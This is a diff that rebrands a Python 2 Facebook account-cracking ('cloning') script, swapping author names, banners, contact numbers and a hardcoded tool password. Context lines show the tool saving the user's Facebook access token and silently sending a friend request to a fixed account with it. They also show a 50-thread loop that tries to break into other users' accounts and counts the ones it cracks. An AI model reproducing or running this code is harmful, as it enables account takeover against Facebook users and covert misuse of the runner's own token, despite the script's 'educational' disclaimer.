@@ -1,10 +1,10 @@
 #!/usr/bin/python2
 #coding=utf-8
-#This Script Is Written By Muhammad Hamza
+#This Script Is Written By Ijaz Afridi
 #Editing My Script Will Not Make You A Codder
   #=================================#
-  # Shafqat The Official Programmrer  #   #                                 #
-  #             [ S.O.P ]           #
+  # Ijaz The Official Programmrer  #   #                                 #
+  #             [ A.H.K ]           #
   #=================================#
 
 
@@ -51,7 +51,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.01)
 		
-#Dev:hamza
+#Dev:Afridi
 ##### LOGO #####
 logo ="""
 
@@ -62,23 +62,23 @@ logo ="""
 \033[1;96m█ ╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝---- █   
 \033[1;97m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 \033[1;97m⊱• ────────────  ──────────── •⊰
-\033[1;96m≫ \033[1;96m CODDED BY :\033[1;96m SHAFQAT ALI
-\033[1;96m≫ \033[1;96m FACEBOOK:\033[1;94m SHAFQAT ALI
-\033[1;96m≫ \033[1;96m WHATSAPP :\033[1;92m +32-460-215-288
+\033[1;96m≫ \033[1;96m CODDED BY :\033[1;96m Ijaz Afridi
+\033[1;96m≫ \033[1;96m FACEBOOK:\033[1;94m Muhammad Ijaz
+\033[1;96m≫ \033[1;96m WHATSAPP :\033[1;92m +923489153973
 \033[1;96m≫ \033[1;96m NOTE :\033[1;95m DONOT  USE WIFI
 \033[1;96m≫ \033[1;96m NOTE :\033[1;95m EDITING MY SCRIPT WILL NOT MAKE YOU A CODER
 \033[1;96m≫ \033[1;96m NOTE :\033[1;95m HAVING PROBLEM? WHATSAPP ME.
 \033[1;96m≫ \033[1;96m Disclamiar :\033[1;95m THIS IS FOR EDUCATIONAL PURPOSE ONLY
 \033[1;96m≫ \033[1;96m WARNING [༗]:\033[1;95m I'M NOT RESPONSIBLE FOR ANY ILLEGAL USE 
 \033[1;97m⊱• ────────────  ──────────── •⊰ 
-╔═══╦╗─╔╦═══╦═══╦═══╦═══╦════╗
-║╔═╗║║─║║╔═╗║╔══╣╔═╗║╔═╗║╔╗╔╗║
-║╚══╣╚═╝║║─║║╚══╣║─║║║─║╠╝║║╚╝
-╚══╗║╔═╗║╚═╝║╔══╣║─║║╚═╝║─║║
-║╚═╝║║─║║╔═╗║║──║╚═╝║╔═╗║─║║
-╚═══╩╝─╚╩╝─╚╩╝──╚══╗╠╝─╚╝─╚╝
-───────────────────╚╝
-───Game Changer─────
+________________________ _______
+\__   __|__    _(  ___  ) ___   )
+   ) (     )  ( | (   ) \/   )  |
+   | |     |  | | (___) |   /   )
+   | |     |  | |  ___  |  /   / 
+   | |     |  | | (   ) | /   /  
+___) (__|\_)  ) | )   ( |/   (_/\
+\_______(____/  |/     \(_______/
 ⊱• ──────────── ──────────── ──────────── •⊰"""
 
 
@@ -100,7 +100,7 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print """
 \033[1;32m ╔════•ೋೋ•════╗ 
-\033[1;97m  Shafqat•••   •••Prog
+\033[1;97m  Ijaz•••   •••Afridi
 \033[1;32m ╚════•ೋೋ•════╝"""
  
 jalan('\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰')
@@ -158,8 +158,8 @@ jalan('\033[1;32m⊱• ──────────── ──────�
 
 jalan('\033[1;34m⊱• ──────────── TOOL LOGIN ──────────── •⊰')
 
-CorrectUsername = "F"
-CorrectPassword = "F"
+CorrectUsername = "afridi"
+CorrectPassword = "afridi"
 
 loop = 'true'
 while (loop == 'true'):
@@ -167,15 +167,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;33mTool Password \x1b[1;31mᐵ \x1b[1;32m")
         if (password == CorrectPassword):
-            print "\033[1;32mACCESS GRANTED AS " + username #Dev:Muhammad_Hamza
+            print "\033[1;32mACCESS GRANTED AS " + username #Dev:Afridi
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;31mACCESS DENIED"
-            os.system('xdg-open https://wa.me/+32-460-215-288')
+            os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
     else:
         print "\033[1;31mACCESS DENIED"
-        os.system('xdg-open https://wa.me/+32-460-215-288')
+        os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
 
 def login():
 	os.system('clear')
@@ -222,7 +222,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;96m•••••༻Login Successful༻•••••'
-				os.system('xdg-open https://wa.me/+32460215288')
+				os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -264,12 +264,12 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:hamz
+	os.system("clear") #Dev:Afridi
 	print logo
 	print "  \033[1;32m⚡\033[1;96m      Logged in User Info\033[1;32m⚡"
 	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
-	print "\033[1;93mSHAFQAT THE OFFICIAL PROGRAMMER[ S•O•P ]"
+	print "\033[1;93mIJAZ THE OFFICIAL PROGRAMMER[ A•H•K ]"
 	
 	print "\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰"
 		
@@ -330,7 +330,7 @@ def pilih_super():
 		print logo
 		idt = raw_input("\033[1;32m〄\033[1;94mInput PublIc Id Username\033[1;33m: \033[1;97m")
 		print """\033[1;32m
-⊱• ───────── SHAFQAT THE OFFICIAL PROGRAMMER[ S.O.P ] ───────── •⊰
+⊱• ───────── IJAZ THE OFFICIAL PROGRAMMER[ A.H.K ] ───────── •⊰
 """
 
 		try:
@@ -358,7 +358,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;94mCloning Is In Progress\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print """
-⊱• ───────── SHAFQAT THE OFFICIAL PROGRAMMER[ S.O.P ] ───────── •⊰
+⊱• ───────── IjAZ THE OFFICIAL PROGRAMMER[ A.H.K ] ───────── •⊰
 
 ─────█─▄▀█──█▀▄─█──
 ────▐▌──────────▐▌──
@@ -587,7 +587,7 @@ def pilih_super():
 	p = ThreadPool(50)
 	p.map(main, id)
 	print "\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰"
-	print "  \033[1;93m⊱•─── Developed By SHAFQAT ALI─── •⊰" #Dev:hamza
+	print "  \033[1;93m⊱•─── Developed By IJAZ AFRIDI─── •⊰" #Dev:Afridi
 	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 arabia.py)↩\033[1;97m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;93m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print """
@@ -605,7 +605,7 @@ def pilih_super():
 ┃┏┓┃┏┓┃┏━┫┏┳┻━╯┃
 ┗┛┗┻┛┗┻┛┊┗┛┗━━━╯
 Checkpoint ID Open After 7 Days
- Having Problem Whatsapp Me :+32-460-215-288"""
+ Having Problem Whatsapp Me :+923489153973"""
 	
 	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
 	menu()
